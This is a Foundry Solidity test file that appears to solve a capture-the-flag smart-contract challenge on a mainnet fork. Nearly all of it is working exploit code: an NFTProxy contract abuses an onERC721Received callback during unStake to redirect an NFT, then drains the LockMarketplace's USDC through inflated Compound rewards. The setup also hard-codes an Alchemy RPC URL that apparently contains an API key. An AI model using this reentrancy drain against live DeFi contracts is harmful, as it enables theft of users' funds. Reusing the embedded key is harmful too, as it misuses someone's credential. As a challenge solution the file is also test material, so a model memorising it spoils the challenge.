// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import "../src/Challenge.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";

contract CounterTest is Test {
    Challenge challenge;
    address player = address(0x1111);

    IERC20 public constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 public constant CUSDC = IERC20(0x39AA39c021dfbaE8faC545936693aC917d5E7563);
    address public constant COMPTROLLER = 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B;

    LockMarketplace public market;
    LockToken public LOCK_TOKEN;
    uint256 public NFT_ID;

    function setUp() public {
        uint256 mainnetFork = vm.createFork("https://eth-mainnet.alchemyapi.io/v2/kIP2_euA9T6Z-e5MjHzTzRUmgqCLsHUA");
        vm.selectFork(mainnetFork);
        vm.rollFork(21614313);

        console.log("fork");
        console.log("blockTImestamp:", block.timestamp);

        challenge = new Challenge(player); //system have 1,000,520 USDC

        deal(address(USDC), address(challenge), 1_000_520e6);

        challenge.deploy();

        market = challenge.LOCK_MARKETPLACE();
        LOCK_TOKEN = challenge.LOCK_TOKEN();
        NFT_ID = challenge.NFT_ID();

        require(USDC.balanceOf(player) == 500e6, "never receive USDC");
    }

    function test_Increment() public {
        console.log("starting  USDC %e", USDC.balanceOf(address(market)));
        console.log("starting cUSDC %e", CUSDC.balanceOf(address(market)));

        vm.startPrank(player);
        USDC.approve(address(market), type(uint256).max);
        NFTProxy proxy = new NFTProxy(challenge, market, LOCK_TOKEN);
        USDC.approve(address(proxy), type(uint256).max);
        proxy.mintEmptyNFT();
        proxy.forceUnstake(address(challenge));
        //now we have 1e12 USDC in market.
        proxy.mintEmptyNFT();
        proxy.drainUSDC();

        //get 1e12 USDC from market. leftover cUSDC inside market stuck in NFT 2 which we donate to Challenge
        //NFT 3 is released.
        NFTProxy proxy2 = new NFTProxy(challenge, market, LOCK_TOKEN);
        USDC.approve(address(proxy2), type(uint256).max);
        proxy2.mintEmptyNFT();
        proxy2.forceUnstake(address(proxy));

        proxy2.drainUSDC();

        console.log("end  USDC %e", USDC.balanceOf(address(market)));
        console.log("end cUSDC %e", CUSDC.balanceOf(address(market)));
        console.log("player USDC %e", USDC.balanceOf(player));

        console.log("solved", challenge.isSolved());
        vm.stopPrank();

        require(challenge.isSolved(), "not solved");
    }
}

contract NFTProxy {
    address owner;
    LockMarketplace public market;
    LockToken public LOCK_TOKEN;
    IERC20 public constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    Challenge public challenge;
    address forceUnstakeTarget;

    uint256 public id;

    constructor(Challenge _challenge, LockMarketplace _market, LockToken _lockToken) {
        owner = msg.sender;
        market = _market;
        LOCK_TOKEN = _lockToken;
        challenge = _challenge;
        USDC.approve(address(market), type(uint256).max);

        LOCK_TOKEN.setApprovalForAll(address(market), true);
    }

    function takeNFTFrom(NFTProxy from, uint256 _id) public {
        from.approveNFTTo(address(this));
        LOCK_TOKEN.transferFrom(from, address(this), _id);
    }

    function approveNFTTo(address to) public {
        LOCK_TOKEN.setApprovalForAll(to, true);
    }

    function mintEmptyNFT() public {
        USDC.transferFrom(msg.sender, address(this), 100e6);
        id = market.mintWithUSDC(address(this), 100e6);
        market.withdrawUSDC(id, 80e6);
        USDC.transfer(owner, 80e6);
        LOCK_TOKEN.setApprovalForAll(address(owner), true);
        LOCK_TOKEN.setApprovalForAll(address(market), true);
    }

    function forceUnstake(address target) public {
        USDC.transferFrom(msg.sender, address(this), 30e6);
        market.depositUSDC(id, 30e6);
        market.stake(id, 30e6);

        forceUnstakeTarget = target;
        market.unStake(address(this), id);

        console.log("NFT deposit %e", market.getDeposit(id));
        console.log("NFT rewards %e", market.getAvailableRewards(address(this)));
    }

    function drainUSDC() public {
        console.log("redeem previous rewards %e", market.getAvailableRewards(address(this)));
        market.redeemCompoundRewards(id, market.getAvailableRewards(address(this)));

        console.log("start drain %e", USDC.balanceOf(address(market)));
        USDC.transferFrom(msg.sender, address(this), USDC.balanceOf(msg.sender));
        uint256 usdcBalance = USDC.balanceOf(address(this));

        market.depositUSDC(id, usdcBalance);
        console.log("new NFT deposit %e", market.getDeposit(id));
        market.stake(id, usdcBalance);
        market.unStake(address(this), id);

        market.withdrawUSDC(id, market.getDeposit(id));

        market.redeemCompoundRewards(id, USDC.balanceOf(address(market)));
        console.log("end drain %e", USDC.balanceOf(address(market)));

        USDC.transfer(owner, USDC.balanceOf(address(this)));
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        returns (bytes4)
    {
        if (forceUnstakeTarget != address(0)) {
            //we transfer NFT to ChallengeContract. current owner lock have >1M cUSDC
            // that will be redeem to this contract. with lots of interest
            LOCK_TOKEN.transferFrom(address(this), address(forceUnstakeTarget), tokenId);
            forceUnstakeTarget = address(0);
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}

interface IERC721Receiver {
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        returns (bytes4);
}
